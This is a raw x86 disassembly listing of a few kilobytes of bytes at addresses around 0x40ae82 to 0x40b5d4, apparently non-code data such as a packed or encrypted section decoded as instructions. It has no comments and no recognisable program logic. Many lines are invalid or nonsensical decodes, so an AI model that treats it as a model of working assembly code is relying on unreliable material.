  40ae82:	xor    al,0xe1
  40ae84:	xchg   ecx,eax
  40ae85:	mov    bl,cl
  40ae87:	jbe    0x40aee7
  40ae89:	xor    BYTE PTR [esi-0x32c6aaa9],dh
  40ae8f:	dec    esi
  40ae90:	mov    al,cl
  40ae92:	mov    eax,ds:0x6e066f4a
  40ae97:	into   
  40ae98:	loopne 0x40ae87
  40ae9a:	arpl   WORD PTR [eax+0x20],bp
  40ae9d:	or     al,0x65
  40ae9f:	push   0xffffffc8
  40aea1:	and    edx,DWORD PTR [edi+0x39]
  40aea4:	aaa    
  40aea5:	cmp    BYTE PTR [ecx+0xe4527c0],bh
  40aeab:	daa    
  40aeac:	ss dec ebx
  40aeae:	mov    dh,0x18
  40aeb0:	push   cs
  40aeb1:	loop   0x40aec9
  40aeb3:	mov    ds:0x5b64860d,eax
  40aeb8:	dec    ebx
  40aeb9:	mov    ch,0x76
  40aebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebc:	and    al,0xd9
  40aebe:	push   edi
  40aebf:	pop    ecx
  40aec0:	test   ah,dh
  40aec2:	arpl   WORD PTR [ebp-0x762f7d9c],sp
  40aec8:	test   al,0x59
  40aeca:	test   BYTE PTR [eax+0x74],0xf4
  40aece:	add    al,BYTE PTR [edi]
  40aed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed1:	stos   DWORD PTR es:[edi],eax
  40aed2:	icebp  
  40aed3:	(bad)  
  40aed4:	fs jecxz 0x40ae95
  40aed7:	mov    edi,0x698bec07
  40aedc:	cmp    DWORD PTR [edx+0x4f6563f3],esi
  40aee2:	mov    ds:0x9876c52b,ax
  40aee8:	and    BYTE PTR [ebp+0x2c],ch
  40aeeb:	pop    ebp
  40aeec:	ret    0x2b2c
  40aeef:	push   eax
  40aef0:	dec    esi
  40aef1:	jbe    0x40af1f
  40aef3:	push   edx
  40aef4:	add    edi,DWORD PTR [ebx]
  40aef6:	fisub  DWORD PTR [edi]
  40aef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef9:	xchg   esp,eax
  40aefa:	mov    bh,0x2b
  40aefc:	xchg   ebp,eax
  40aefd:	sub    ch,BYTE PTR ds:0x878c7f53
  40af03:	mov    WORD PTR [ecx],?
  40af05:	jge    0x40af20
  40af07:	fs rol ebx,1
  40af0a:	mov    dl,0xa4
  40af0c:	cld    
  40af0d:	xor    DWORD PTR [edx+0x34],ecx
  40af10:	dec    edx
  40af11:	mov    dl,0xbb
  40af13:	mov    DWORD PTR [eax+0x73b646eb],esp
  40af19:	cdq    
  40af1a:	dec    esi
  40af1b:	push   ss
  40af1c:	mov    eax,0x1da64353
  40af21:	add    ecx,DWORD PTR [esi-0x38]
  40af24:	sti    
  40af25:	cmp    al,0x88
  40af27:	iret   
  40af28:	sub    esp,DWORD PTR [ecx-0x732066a0]
  40af2e:	loopne 0x40aedc
  40af30:	add    DWORD PTR [edi-0x31710cf2],edx
  40af36:	cmp    cl,dl
  40af38:	jle    0x40af8d
  40af3a:	cmc    
  40af3b:	ror    BYTE PTR [esi+0x2],1
  40af3e:	jne    0x40aee3
  40af40:	frstor [ebx-0x35303a15]
  40af46:	call   0x7621:0xac42a5ff
  40af4d:	xchg   ebx,eax
  40af4e:	sbb    al,0x90
  40af50:	xlat   BYTE PTR ds:[ebx]
  40af51:	xchg   edi,eax
  40af52:	pop    ebx
  40af53:	std    
  40af54:	repnz or DWORD PTR [edi+ecx*1+0x18],0x51
  40af5a:	sbb    esp,DWORD PTR [edx+0x1364d12d]
  40af60:	shr    BYTE PTR [esi-0x4edfb18c],cl
  40af66:	out    dx,eax
  40af67:	mov    edx,0xd908d19
  40af6c:	retf   
  40af6d:	cdq    
  40af6e:	xchg   esp,eax
  40af6f:	adc    BYTE PTR [ebx],dl
  40af71:	mov    esi,0x3b037d9b
  40af76:	mov    ch,0xa9
  40af78:	js     0x40af7d
  40af7a:	cmp    ebp,eax
  40af7c:	jbe    0x40af64
  40af7e:	mov    eax,0xe500ace7
  40af83:	xrelease xchg DWORD PTR [esi-0x79412310],ecx
  40af8a:	pop    ebx
  40af8b:	and    dl,BYTE PTR [edx+0x4cf121c7]
  40af91:	not    DWORD PTR [ecx]
  40af93:	rol    BYTE PTR [eax],0xff
  40af96:	icebp  
  40af97:	sub    al,0x0
  40af99:	add    eax,0x8ca5c0a6
  40af9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9f:	ins    BYTE PTR es:[edi],dx
  40afa0:	ins    BYTE PTR es:[edi],dx
  40afa1:	popf   
  40afa2:	cmp    eax,0x12271434
  40afa7:	call   0x8063a5c0
  40afac:	inc    ecx
  40afad:	inc    ebp
  40afae:	push   edi
  40afb0:	mov    ah,0x15
  40afb2:	jb     0xdb3871d9
  40afb8:	aaa    
  40afb9:	int3   
  40afba:	shr    BYTE PTR [ecx-0x2b],0x4a
  40afbe:	cmp    edi,DWORD PTR [eax-0x20]
  40afc1:	clc    
  40afc2:	jle    0x40afdc
  40afc4:	xor    ebp,ecx
  40afc6:	lods   al,BYTE PTR ds:[esi]
  40afc7:	jmp    0x2abd:0x38d12dee
  40afce:	(bad)  
  40afcf:	in     al,dx
  40afd0:	or     al,0x3f
  40afd2:	lds    edx,FWORD PTR [eax-0x73]
  40afd5:	(bad)  
  40afd6:	sti    
  40afd7:	out    dx,al
  40afd8:	jl     0x40af6c
  40afda:	pop    ss
  40afdb:	mov    gs:0xc18fcfeb,eax
  40afe1:	add    eax,0x2b985816
  40afe6:	bound  ebp,QWORD PTR [esi+eax*8]
  40afe9:	(bad)  
  40afea:	lods   eax,DWORD PTR ds:[esi]
  40afeb:	lea    esp,[eax-0x25]
  40afee:	and    edx,DWORD PTR [edi-0xeb9f259]
  40aff4:	adc    DWORD PTR [eax],ecx
  40aff6:	jns    0x40b020
  40aff8:	inc    esp
  40aff9:	lahf   
  40affa:	shr    dh,1
  40affc:	xor    esp,esp
  40affe:	xlat   BYTE PTR ds:[ebx]
  40afff:	cmp    eax,0xb6daec74
  40b004:	pop    esp
  40b005:	fld    TBYTE PTR [esp+ebx*2]
  40b008:	(bad)
  40b00c:	std    
  40b00d:	(bad)  
  40b00f:	bnd jp 0x40aff5
  40b012:	in     al,0xaa
  40b014:	shl    BYTE PTR [edx+0x6b],1
  40b017:	push   es
  40b018:	sbb    eax,0xbea59b16
  40b01d:	dec    edx
  40b01e:	push   0xffffffd5
  40b020:	mov    edi,es
  40b022:	xor    DWORD PTR [eax-0x2d],eax
  40b025:	jnp    0x40b068
  40b027:	out    dx,al
  40b028:	sbb    eax,0xe2d80631
  40b02d:	das    
  40b02e:	inc    edx
  40b02f:	in     eax,dx
  40b030:	and    eax,0xfc47a346
  40b035:	push   es
  40b036:	dec    edi
  40b037:	fldcw  WORD PTR [ebx-0x547278de]
  40b03d:	jbe    0x40b043
  40b03f:	push   edi
  40b040:	pop    esp
  40b041:	sub    eax,0x373b9add
  40b046:	je     0x40b0c0
  40b048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b049:	aas    
  40b04a:	dec    ecx
  40b04b:	adc    esi,DWORD PTR [eax+0x4a]
  40b04e:	mov    bh,0x84
  40b050:	loope  0x40b019
  40b052:	push   0x92ddc407
  40b057:	mov    cl,0x3f
  40b059:	inc    edx
  40b05a:	sbb    ch,BYTE PTR [eax]
  40b05c:	jae    0x40b086
  40b05e:	or     al,0x6c
  40b060:	ficom  DWORD PTR [edx-0x55]
  40b063:	xchg   esp,eax
  40b064:	rcr    bl,0xc0
  40b067:	stos   BYTE PTR es:[edi],al
  40b068:	imul   esp,DWORD PTR [edx+0x18],0x1e
  40b06c:	outs   dx,BYTE PTR ds:[esi]
  40b06d:	inc    esp
  40b06e:	lahf   
  40b06f:	mov    esi,0x35839f3f
  40b074:	cmc    
  40b075:	inc    ebx
  40b076:	idiv   BYTE PTR [ebx-0x59fd26c6]
  40b07c:	jl     0x40b033
  40b07e:	iret   
  40b07f:	les    edx,FWORD PTR [esp+edi*8-0x18]
  40b083:	push   ebx
  40b084:	cwde   
  40b085:	fst    QWORD PTR [edx+0x44]
  40b088:	mov    ah,0x78
  40b08a:	dec    ecx
  40b08b:	or     al,0xba
  40b08d:	sub    BYTE PTR ds:[esi],0x9
  40b091:	dec    esi
  40b092:	test   eax,0xcb5f55bc
  40b097:	mov    ebp,0xcfb9e109
  40b09c:	loop   0x40b109
  40b09e:	ror    ah,cl
  40b0a0:	ret    
  40b0a1:	scas   eax,DWORD PTR es:[edi]
  40b0a2:	xbegin 0xd9113788
  40b0a8:	in     al,0x25
  40b0aa:	es pusha 
  40b0ac:	mul    BYTE PTR [edx+0x2036bebb]
  40b0b2:	dec    esp
  40b0b3:	pop    es
  40b0b4:	inc    edi
  40b0b5:	mov    esp,0xc3505d09
  40b0ba:	inc    ebx
  40b0bb:	aam    0x3e
  40b0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0be:	inc    esi
  40b0bf:	push   ebp
  40b0c0:	out    0xa0,al
  40b0c2:	popf   
  40b0c3:	or     eax,0xce7d8070
  40b0c8:	mov    esi,0x51404b48
  40b0cd:	pop    ds
  40b0ce:	outs   dx,DWORD PTR ds:[esi]
  40b0cf:	add    cl,BYTE PTR [ecx-0x2762e943]
  40b0d5:	retf   
  40b0d6:	jnp    0x40b09c
  40b0d8:	cwde   
  40b0d9:	xchg   ebp,eax
  40b0da:	or     esp,esp
  40b0dc:	out    dx,eax
  40b0dd:	icebp  
  40b0de:	lahf   
  40b0df:	adc    BYTE PTR [edi],ah
  40b0e1:	js     0x40b070
  40b0e3:	(bad)  
  40b0e4:	repnz sbb ah,BYTE PTR [eax-0x52]
  40b0e8:	(bad)  
  40b0ea:	shl    BYTE PTR [edi-0x2e],cl
  40b0ed:	jl     0x40b0d4
  40b0ef:	or     eax,0xdeeaca25
  40b0f4:	or     esp,esp
  40b0f6:	push   0xfffffffe
  40b0f8:	mov    dl,BYTE PTR [edx-0x4f]
  40b0fb:	jecxz  0x40b0dd
  40b0fd:	jae    0x40b11c
  40b0ff:	retf   
  40b100:	push   ss
  40b101:	xchg   DWORD PTR ds:0xeea8c9d2,ecx
  40b107:	push   ebx
  40b108:	add    ebp,edi
  40b10a:	pandn  mm2,QWORD PTR [esi+ecx*2+0x1d5fb684]
  40b112:	loop   0x40b0c2
  40b114:	scas   al,BYTE PTR es:[edi]
  40b115:	dec    ecx
  40b116:	and    al,0x5e
  40b118:	jnp    0x40b153
  40b11a:	das    
  40b11b:	mov    bl,BYTE PTR [ebp-0x705368bc]
  40b121:	and    dl,ah
  40b123:	or     eax,0xefe18db9
  40b128:	fist   DWORD PTR [edx]
  40b12a:	dec    ebp
  40b12b:	arpl   WORD PTR [ebx],bx
  40b12d:	js     0x40b112
  40b12f:	xchg   ebp,eax
  40b130:	aam    0x6b
  40b132:	mov    al,0xc8
  40b134:	or     edi,DWORD PTR [eax-0x35697f12]
  40b13a:	data16 (bad) 
  40b13c:	cli    
  40b13d:	imul   edi,DWORD PTR [eax*4+0x14c4dfe9],0x84dd995e
  40b148:	repnz mov eax,0xf1f34dbd
  40b14e:	aas    
  40b14f:	xchg   DWORD PTR [esi-0x5b],eax
  40b152:	bswap  ecx
  40b154:	je     0x40b19b
  40b156:	pop    edx
  40b157:	data16 or al,BYTE PTR [ebp-0x2e]
  40b15b:	ss pop ds
  40b15d:	mov    WORD PTR [eax],gs
  40b15f:	or     ah,BYTE PTR [ebp-0x5b]
  40b162:	mov    ds:0xf3e07dba,al
  40b167:	test   DWORD PTR [ecx],edi
  40b169:	test   al,0x82
  40b16b:	lock fist WORD PTR [ecx]
  40b16e:	sbb    bh,bl
  40b170:	mov    BYTE PTR [ebx],bh
  40b172:	mov    ch,0xf2
  40b174:	cmp    BYTE PTR [edx+0x38abf6fc],dl
  40b17a:	jae    0x40b144
  40b17c:	sub    ah,ch
  40b17e:	mov    ch,0x6f
  40b180:	adc    BYTE PTR [eax+0x4e],al
  40b183:	lds    ebp,FWORD PTR [ebp+0x6cd1e80]
  40b189:	cmp    bl,BYTE PTR [ebp-0x385e4270]
  40b18f:	outs   dx,DWORD PTR ds:[esi]
  40b190:	push   cs
  40b191:	or     BYTE PTR [esp+ecx*4],al
  40b194:	dec    edi
  40b195:	clc    
  40b196:	push   es
  40b197:	ds push edi
  40b199:	cmp    eax,DWORD PTR fs:[edi+0x2976251]
  40b1a0:	out    0xba,al
  40b1a2:	push   esi
  40b1a3:	xchg   ebx,eax
  40b1a4:	clc    
  40b1a5:	and    BYTE PTR [eax+0x4b],cl
  40b1a8:	retf   
  40b1a9:	into   
  40b1aa:	push   ss
  40b1ab:	xor    al,dl
  40b1ad:	iret   
  40b1ae:	xchg   esp,eax
  40b1af:	sbb    DWORD PTR [ecx],ebx
  40b1b1:	sbb    BYTE PTR [esi],0x1e
  40b1b4:	out    0xb9,al
  40b1b6:	inc    esi
  40b1b7:	jecxz  0x40b185
  40b1b9:	mov    esi,0x21a1d037
  40b1be:	mov    cl,0x12
  40b1c0:	pop    edx
  40b1c1:	mov    ds:0xa485b95d,al
  40b1c6:	mov    bl,0xa0
  40b1c8:	push   ebp
  40b1c9:	cmp    bl,BYTE PTR ds:0x492471b6
  40b1cf:	xchg   ebx,eax
  40b1d0:	and    esi,DWORD PTR [ecx+0x4c3cd94d]
  40b1d6:	fs dec ebp
  40b1d8:	dec    ebx
  40b1d9:	mov    ah,0xa2
  40b1db:	and    BYTE PTR [esi],0x8a
  40b1de:	mov    al,0xd3
  40b1e0:	jp     0x40b24a
  40b1e2:	mov    eax,ds:0xc0a8c432
  40b1e7:	ret    
  40b1e8:	lea    eax,[ebx+ebp*8-0x4aed9754]
  40b1ef:	jge    0x40b1f5
  40b1f1:	pop    edi
  40b1f2:	lock int3 
  40b1f4:	and    DWORD PTR [ebp+0x52557265],esp
  40b1fa:	ror    edi,0x70
  40b1fd:	mov    ?,WORD PTR [eax+0x71b98fe0]
  40b203:	mov    eax,0x41db2b46
  40b208:	xchg   edx,eax
  40b209:	iret   
  40b20a:	imul   esp,DWORD PTR [ebp-0x5f],0xffffff93
  40b20e:	xchg   ebp,eax
  40b20f:	mov    bh,0xe1
  40b211:	jg     0x40b1e0
  40b213:	loope  0x40b1ce
  40b215:	cld    
  40b216:	dec    edx
  40b217:	iret   
  40b218:	inc    esi
  40b219:	lahf   
  40b21a:	or     al,0x3a
  40b21c:	add    BYTE PTR ds:0x9d2bfc28,ah
  40b222:	lea    eax,[ebx+0x1014acc4]
  40b228:	xchg   ebx,eax
  40b229:	(bad)  
  40b22b:	add    BYTE PTR [ebx],0xd8
  40b22e:	mov    es,WORD PTR [eax-0x3a]
  40b231:	sbb    ebp,DWORD PTR [ecx+esi*8]
  40b234:	shr    DWORD PTR [ebx-0x48492a3a],1
  40b23a:	jp     0x40b1f9
  40b23c:	jg     0x40b287
  40b23e:	(bad)  
  40b23f:	scas   eax,DWORD PTR es:[edi]
  40b240:	fisubr DWORD PTR [esi]
  40b242:	mov    dh,0x72
  40b244:	(bad)  
  40b245:	cld    
  40b246:	pop    eax
  40b247:	icebp  
  40b248:	pop    esi
  40b249:	neg    cl
  40b24b:	pop    edi
  40b24c:	pop    edi
  40b24d:	jecxz  0x40b201
  40b24f:	in     al,0x61
  40b251:	aas    
  40b252:	mov    ?,WORD PTR [edi-0x146115a3]
  40b258:	pusha  
  40b259:	div    dh
  40b25b:	sbb    DWORD PTR [edx-0x7],edi
  40b25e:	pop    eax
  40b25f:	xchg   ebx,eax
  40b260:	pushf  
  40b261:	fwait
  40b262:	add    DWORD PTR [esi],ecx
  40b264:	xchg   ebx,eax
  40b265:	pop    ss
  40b266:	pop    esp
  40b267:	inc    ebx
  40b268:	mov    al,0x9c
  40b26a:	jnp    0x40b26f
  40b26c:	adc    eax,0x8241cb88
  40b271:	idiv   DWORD PTR [edi+0x20]
  40b274:	dec    ebx
  40b275:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b277:	mov    al,ds:0xf0cc8c67
  40b27c:	jp     0x40b2bc
  40b27e:	pop    ds
  40b27f:	pop    esi
  40b280:	or     cl,BYTE PTR [ebx+0x35649f3e]
  40b286:	lods   al,BYTE PTR ds:[esi]
  40b287:	je     0x40b2a1
  40b289:	pop    ss
  40b28a:	and    al,0xe8
  40b28c:	repnz sub esp,DWORD PTR [edx]
  40b28f:	ins    DWORD PTR es:[edi],dx
  40b290:	pop    ecx
  40b291:	dec    edi
  40b292:	mov    ch,0x8e
  40b294:	fs sbb al,0xd5
  40b297:	mov    al,ds:0x3118127e
  40b29c:	xchg   BYTE PTR [esi-0xf8059dd],cl
  40b2a2:	sub    BYTE PTR [ecx-0x4],bh
  40b2a5:	lods   eax,DWORD PTR ds:[esi]
  40b2a6:	mov    bh,BYTE PTR [esi+0x2aae9b7d]
  40b2ac:	rol    ah,0x4a
  40b2af:	sbb    al,BYTE PTR [ecx+ebp*8+0x23]
  40b2b3:	and    ah,0x86
  40b2b6:	ss push ds
  40b2b8:	pop    edi
  40b2b9:	and    dh,dh
  40b2bb:	xchg   edi,eax
  40b2bc:	and    dh,BYTE PTR ds:0x6d860dc
  40b2c2:	loopne 0x40b2e0
  40b2c4:	xchg   ecx,eax
  40b2c5:	test   eax,0xe06ed674
  40b2ca:	mov    dh,0x4d
  40b2cc:	test   bl,bl
  40b2ce:	stos   DWORD PTR es:[edi],eax
  40b2cf:	lock push ds
  40b2d1:	lods   al,BYTE PTR ds:[esi]
  40b2d2:	mov    ds:0x3cbbca78,al
  40b2d7:	std    
  40b2d8:	pop    ss
  40b2d9:	fstp   TBYTE PTR [edx+0x34]
  40b2dc:	outs   dx,DWORD PTR ds:[esi]
  40b2dd:	mov    bl,0x1a
  40b2df:	fcmovnu st,st(3)
  40b2e1:	out    dx,al
  40b2e2:	(bad)  
  40b2e4:	pop    eax
  40b2e5:	push   es
  40b2e6:	mov    cl,0xb6
  40b2e8:	mov    bh,0x26
  40b2ea:	(bad)  
  40b2eb:	dec    ecx
  40b2ec:	sub    bh,BYTE PTR [ebx-0x5e]
  40b2ef:	cdq    
  40b2f0:	repz es push edi
  40b2f3:	adc    DWORD PTR [ebp+0x13],0x57
  40b2f7:	fs popf 
  40b2f9:	sbb    ah,BYTE PTR ds:0x16d62085
  40b2ff:	stos   BYTE PTR es:[edi],al
  40b300:	push   es
  40b301:	mov    BYTE PTR [eax-0x3a],dl
  40b304:	mov    bl,0xf7
  40b306:	pop    ss
  40b307:	push   ds
  40b308:	js     0x40b326
  40b30a:	sbb    DWORD PTR [eax+0xc],edi
  40b30d:	pop    ecx
  40b30e:	cmp    edi,DWORD PTR [eax-0x57]
  40b311:	sub    eax,0xeb522a3f
  40b316:	arpl   WORD PTR [ebx-0xc],dx
  40b319:	fisttp DWORD PTR [ebp+0x12]
  40b31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b31d:	pop    ebx
  40b31e:	mov    WORD PTR [ebx-0x608b2e9e],?
  40b324:	jg     0x40b33d
  40b326:	dec    edi
  40b327:	pop    eax
  40b328:	scas   al,BYTE PTR es:[edi]
  40b329:	add    eax,0xaf40125d
  40b32e:	mov    eax,ds:0xfb82af73
  40b333:	dec    ebx
  40b334:	cmp    cl,BYTE PTR [ebp+ebx*2+0x7e0c9650]
  40b33b:	jle    0x40b3a6
  40b33d:	rcl    ebp,0xac
  40b340:	(bad)  
  40b341:	cdq    
  40b342:	jae    0x40b338
  40b344:	adc    eax,0x50c694f1
  40b349:	inc    ecx
  40b34a:	ror    BYTE PTR ds:0x6de66c9b,1
  40b350:	push   esp
  40b351:	dec    edi
  40b352:	mov    ah,0x4
  40b354:	dec    esp
  40b355:	mov    bh,0x30
  40b357:	in     eax,dx
  40b358:	shl    BYTE PTR [edi-0x16],cl
  40b35b:	jecxz  0x40b2e5
  40b35d:	outs   dx,DWORD PTR ds:[esi]
  40b35e:	push   eax
  40b35f:	icebp  
  40b360:	jbe    0x40b338
  40b362:	cmp    dl,BYTE PTR [esi-0x7d1555a0]
  40b368:	xor    DWORD PTR [ecx+0x496901e7],0xffffff88
  40b36f:	sub    eax,0x6b5161b4
  40b374:	nop
  40b375:	fs ret 
  40b377:	fist   DWORD PTR [esi]
  40b379:	push   0xffffff8a
  40b37b:	inc    edx
  40b37c:	inc    esi
  40b37d:	enter  0x820f,0xae
  40b381:	sti    
  40b382:	mov    dh,0xfd
  40b384:	cmp    edx,DWORD PTR [eax-0x1b]
  40b387:	je     0x40b362
  40b389:	mov    ds:0xe3205a20,al
  40b38e:	xlat   BYTE PTR ds:[ebx]
  40b38f:	pop    edx
  40b390:	mov    ecx,0x56db1e0d
  40b395:	gs clc 
  40b397:	adc    eax,0xa4d379f3
  40b39c:	xor    dh,bh
  40b39e:	cmp    DWORD PTR [ecx-0x50bf38e],edi
  40b3a4:	imul   ebx,DWORD PTR [edx],0x66
  40b3a7:	cdq    
  40b3a8:	jb     0x40b3f2
  40b3aa:	xor    al,0x49
  40b3ac:	in     al,0x20
  40b3ae:	cmp    cl,ch
  40b3b0:	sbb    al,0x3b
  40b3b2:	call   DWORD PTR [edx]
  40b3b4:	stos   DWORD PTR es:[edi],eax
  40b3b5:	(bad)  
  40b3b6:	out    dx,eax
  40b3b7:	mov    al,BYTE PTR [edx+ecx*4+0x6641ba3]
  40b3be:	or     al,0x56
  40b3c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3c1:	adc    edi,0xeb1a0718
  40b3c7:	ret    
  40b3c8:	(bad)  
  40b3c9:	lea    eax,[edx-0x45d0a6cc]
  40b3cf:	mov    ecx,0x511a6678
  40b3d4:	cmp    ah,BYTE PTR [eax]
  40b3d6:	xchg   edx,eax
  40b3d7:	push   0x4dd9916f
  40b3dc:	out    0x4c,eax
  40b3de:	lods   eax,DWORD PTR ds:[esi]
  40b3df:	sbb    al,0x39
  40b3e1:	xchg   edi,eax
  40b3e2:	cmp    dh,ah
  40b3e4:	imul   edi,DWORD PTR [eax+ebx*4+0x37db13ae],0x48a00f2e
  40b3ef:	xchg   edi,eax
  40b3f0:	adc    BYTE PTR [edx+edx*8-0x50324509],ah
  40b3f7:	imul   ebx,DWORD PTR [ebx+ebp*8+0x22bf769a],0xffffff93
  40b3ff:	inc    ebp
  40b400:	dec    edx
  40b401:	adc    eax,0xd385eada
  40b406:	js     0x40b3cf
  40b408:	data16 sub bh,dh
  40b40b:	push   eax
  40b40c:	shl    BYTE PTR [ebp-0x1d],0x1f
  40b410:	daa    
  40b411:	add    dl,ch
  40b413:	jno    0x40b3c6
  40b415:	and    al,bh
  40b417:	in     al,0xf
  40b419:	xor    DWORD PTR [ecx-0x41fd27a],eax
  40b41f:	(bad)  
  40b420:	cmp    DWORD PTR [edi],edi
  40b422:	lods   al,BYTE PTR ds:[esi]
  40b423:	sbb    DWORD PTR [edx],esi
  40b425:	sbb    esi,DWORD PTR [esi+0xb]
  40b428:	xor    DWORD PTR [ebx],eax
  40b42a:	sbb    bl,BYTE PTR [ebx]
  40b42c:	add    al,0x2d
  40b42e:	lock repz sub edi,DWORD PTR [edx-0x72]
  40b433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b434:	sbb    BYTE PTR [eax+ecx*1],dl
  40b437:	pop    edx
  40b438:	js     0x40b488
  40b43a:	xor    al,0x2e
  40b43c:	fstp   st(5)
  40b43e:	fs jmp 0x40b3c4
  40b441:	cli    
  40b442:	push   ds
  40b443:	sbb    ecx,esp
  40b445:	shr    eax,cl
  40b447:	aam    0xd5
  40b449:	dec    eax
  40b44a:	inc    esi
  40b44b:	pop    ss
  40b44c:	dec    ecx
  40b44d:	stos   DWORD PTR es:[edi],eax
  40b44e:	sub    al,dl
  40b450:	fwait
  40b451:	xchg   ebx,eax
  40b452:	scas   eax,DWORD PTR es:[edi]
  40b453:	adc    eax,0x4b5274f0
  40b458:	sar    dl,0x1f
  40b45b:	and    BYTE PTR [ebp-0x58a9ae7b],ah
  40b461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b462:	fisubr DWORD PTR [eax+0x2d]
  40b465:	stc    
  40b466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b467:	push   ds
  40b468:	xchg   ebp,eax
  40b469:	mov    esp,esi
  40b46b:	outs   dx,DWORD PTR ds:[esi]
  40b46c:	nop
  40b46d:	ror    BYTE PTR [edx-0x4729578c],0xcb
  40b474:	loope  0x40b4ec
  40b476:	jmp    0x5b387a53
  40b47b:	arpl   WORD PTR [ebp+0x62],si
  40b47e:	addr16 sbb eax,0xafe15fce
  40b484:	pop    edx
  40b485:	not    BYTE PTR [edx+0x4f02a30b]
  40b48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b48c:	pop    ss
  40b48d:	mov    dh,0x1d
  40b48f:	stc    
  40b490:	xor    DWORD PTR [eax],esi
  40b492:	test   eax,0x1c5c8a62
  40b497:	inc    esi
  40b498:	pop    ss
  40b499:	cli    
  40b49a:	xchg   edi,eax
  40b49b:	clc    
  40b49c:	jp     0x40b4b1
  40b49e:	call   ebp
  40b4a0:	mov    ds:0xb192b044,eax
  40b4a5:	dec    eax
  40b4a6:	add    al,0xa1
  40b4a8:	xchg   edx,eax
  40b4a9:	test   eax,0xd8bbde82
  40b4ae:	dec    edx
  40b4af:	mov    DWORD PTR [eax+esi*8+0x323277b4],ebp
  40b4b6:	ret    
  40b4b7:	inc    ebx
  40b4b8:	aad    0x98
  40b4ba:	jae    0x40b4d3
  40b4bc:	(bad)  
  40b4bd:	lock fbstp TBYTE PTR [ebx]
  40b4c0:	jne    0x40b445
  40b4c2:	jmp    0x2dadcb97
  40b4c7:	(bad)  
  40b4c8:	mov    ch,0x2f
  40b4ca:	add    edx,ebx
  40b4cc:	jge    0x40b4f2
  40b4ce:	pop    ss
  40b4cf:	fisub  DWORD PTR [eax-0x3c]
  40b4d2:	pop    esi
  40b4d3:	scas   eax,DWORD PTR es:[edi]
  40b4d4:	jecxz  0x40b520
  40b4d6:	or     ebp,DWORD PTR [ecx+0x1a]
  40b4d9:	jmp    0x40b4bb
  40b4db:	mov    eax,ds:0xb0bb800d
  40b4e0:	mov    bl,0x59
  40b4e2:	jmp    0x8efaad65
  40b4e7:	inc    edi
  40b4e8:	inc    edx
  40b4e9:	fild   WORD PTR [esi+0x1d5ef15f]
  40b4ef:	inc    esi
  40b4f0:	or     DWORD PTR [ecx+edx*4+0x37],ebp
  40b4f4:	cli    
  40b4f5:	push   edi
  40b4f6:	adc    BYTE PTR [eax-0x4e],bl
  40b4f9:	xchg   al,cl
  40b4fb:	out    dx,eax
  40b4fc:	push   0x3a
  40b4fe:	xor    edx,ebp
  40b500:	sub    bh,BYTE PTR [esi+0x47]
  40b503:	jecxz  0x40b572
  40b505:	pop    ds
  40b506:	call   0x22cb0d8e
  40b50b:	mov    edx,0xce413cd
  40b510:	fstp   DWORD PTR ds:0xe2645f39
  40b516:	repz cld 
  40b518:	and    bl,BYTE PTR [esi+edi*8]
  40b51b:	push   0x19370325
  40b520:	adc    ch,BYTE PTR [ebp-0xce1c10e]
  40b526:	retf   0xacc7
  40b529:	dec    eax
  40b52a:	scas   al,BYTE PTR es:[edi]
  40b52b:	or     ebx,eax
  40b52d:	jae    0x40b511
  40b52f:	cli    
  40b530:	stc    
  40b531:	xor    ebp,DWORD PTR ds:0xea8b0f05
  40b537:	ds push esi
  40b53a:	dec    edi
  40b53b:	out    0xe5,al
  40b53d:	(bad)  
  40b53e:	sub    al,0x60
  40b540:	inc    ebp
  40b541:	pop    ss
  40b542:	cld    
  40b543:	pop    edx
  40b544:	mov    ebp,0xd3eea0a0
  40b549:	in     al,dx
  40b54a:	push   esp
  40b54b:	pop    es
  40b54c:	or     edx,DWORD PTR [eax+ecx*1-0x417123fe]
  40b553:	test   al,0x3d
  40b555:	fstp   TBYTE PTR [edi+0x23]
  40b558:	aam    0x75
  40b55a:	add    al,0x25
  40b55c:	arpl   WORD PTR [edx+0x7faf6bdd],di
  40b562:	mov    ds:0xbf868833,eax
  40b567:	fisttp DWORD PTR [edx+0x56bd9f5e]
  40b56d:	adc    bh,BYTE PTR [edx-0x2001ffb5]
  40b573:	sahf   
  40b574:	ret    
  40b575:	xchg   ebp,eax
  40b576:	int    0xe6
  40b578:	sar    WORD PTR [ecx+eax*8],1
  40b57c:	retf   
  40b57d:	scas   eax,DWORD PTR es:[edi]
  40b57e:	popa   
  40b57f:	pop    ds
  40b580:	xchg   edx,eax
  40b581:	lea    esi,[ebp-0x2]
  40b584:	and    al,0x9e
  40b586:	dec    ebx
  40b587:	pop    edi
  40b588:	pusha  
  40b589:	out    0xce,eax
  40b58b:	mov    bl,0x5f
  40b58d:	mov    ds:0xfafac188,eax
  40b592:	sub    al,0xab
  40b594:	mov    edx,0x75c0cd83
  40b599:	dec    edx
  40b59a:	leave  
  40b59b:	push   eax
  40b59c:	mov    eax,ds:0xb1d92d27
  40b5a1:	lock sbb BYTE PTR [esi+0x427766d],bl
  40b5a8:	in     eax,dx
  40b5a9:	adc    al,dl
  40b5ab:	fcomip st,st(7)
  40b5ad:	repz mul ebx
  40b5b0:	loop   0x40b53e
  40b5b2:	push   ebx
  40b5b4:	les    edx,FWORD PTR [eax+0x4ed7b4d9]
  40b5ba:	dec    esp
  40b5bb:	in     al,0x10
  40b5bd:	xchg   edx,eax
  40b5be:	and    eax,0xa7569b80
  40b5c3:	mov    edi,0x1ff62683
  40b5c8:	imul   edx,ebp,0x40
  40b5cb:	jnp    0x40b5c9
  40b5cd:	pop    ss
  40b5ce:	push   0xde9c472b
  40b5d3:	pop    edx
  40b5d4:	jmp    FWORD PTR [edx]
